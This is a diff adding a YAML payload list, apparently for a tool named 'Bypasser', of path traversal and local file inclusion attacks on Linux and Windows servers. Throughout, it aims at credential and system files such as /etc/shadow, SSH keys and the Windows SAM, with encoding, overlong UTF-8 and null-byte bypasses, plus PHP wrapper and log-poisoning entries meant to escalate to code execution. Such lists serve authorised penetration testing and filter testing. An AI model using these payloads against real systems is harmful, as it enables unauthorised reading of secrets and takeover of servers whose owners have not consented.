@@ -1,0 +1,80 @@
+# Bypasser - payloads Path Traversal / LFI (Linux e Windows)
+# Ajuste a profundidade (../../..) conforme a estrutura do alvo.
+payloads:
+  # --- Linux classico ---
+  - "../../../../etc/passwd"
+  - "../../../etc/passwd"
+  - "../../etc/passwd"
+  - "/etc/passwd"
+  - "../../../../etc/shadow"
+  - "../../../../etc/hosts"
+  - "../../../../etc/hostname"
+  - "../../../../proc/self/environ"
+  - "../../../../proc/self/cmdline"
+  - "../../../../proc/version"
+  - "../../../../etc/apache2/apache2.conf"
+  - "../../../../etc/nginx/nginx.conf"
+  - "../../../../var/log/apache2/access.log"
+  - "../../../../var/log/nginx/access.log"
+  - "../../../../home/user/.ssh/id_rsa"
+  - "../../../../root/.ssh/authorized_keys"
+
+  # --- Windows ---
+  - "..\\..\\..\\..\\windows\\win.ini"
+  - "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+  - "..\\..\\..\\..\\boot.ini"
+  - "..\\..\\..\\..\\inetpub\\wwwroot\\web.config"
+  - "..\\..\\..\\..\\windows\\system32\\config\\SAM"
+  - "..\\..\\..\\..\\windows\\system32\\license.rtf"
+  - "%SYSTEMROOT%\\win.ini"
+
+  # --- encoding unico ---
+  - "..%2f..%2f..%2f..%2fetc%2fpasswd"
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "..%2f..%2f..%2f..%2fwindows%2fwin.ini"
+  - "....//....//....//etc/passwd"
+  - "..;/..;/..;/etc/passwd"               # bypass Tomcat/Java
+  - "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+
+  # --- encoding duplo / triplo ---
+  - "..%252f..%252f..%252f..%252fetc%252fpasswd"
+  - "%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+  - "..%255c..%255c..%255cwindows%255cwin.ini"
+
+  # --- overlong UTF-8 / unicode (IIS) ---
+  - "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+  - "%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
+  - "%uff0e%uff0e%u2215etc%u2215passwd"
+
+  # --- null byte (apps antigas/ASP) ---
+  - "../../../../etc/passwd%00.png"
+  - "../../../../etc/passwd%00"
+  - "../../../../etc/passwd%00.jpg"
+
+  # --- normalizacao de path ---
+  - "/./../../../../etc/passwd"
+  - "....//....//....//....//etc/passwd"
+  - "..////..////..////etc/passwd"
+  - "..././..././..././etc/passwd"
+
+  # --- wrappers PHP ---
+  - "php://filter/convert.base64-encode/resource=/etc/passwd"
+  - "php://filter/convert.base64-encode/resource=index.php"
+  - "php://filter/read=convert.base64-encode/resource=config.php"
+  - "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+  - "php://input"
+  - "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
+  - "expect://id"
+  - "zip:///var/www/html/uploads/shell.zip%23shell.php"
+
+  # --- log poisoning (LFI -> RCE) ---
+  - "../../../../var/log/apache2/error.log"
+  - "../../../../var/log/auth.log"
+  - "../../../../../var/log/apache2/error.log"
+
+  # --- bypass de filtros comuns ---
+  - "....//....//....//etc//passwd"
+  - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "file:///etc/passwd"
+  - "file:///var/www/html/index.php"
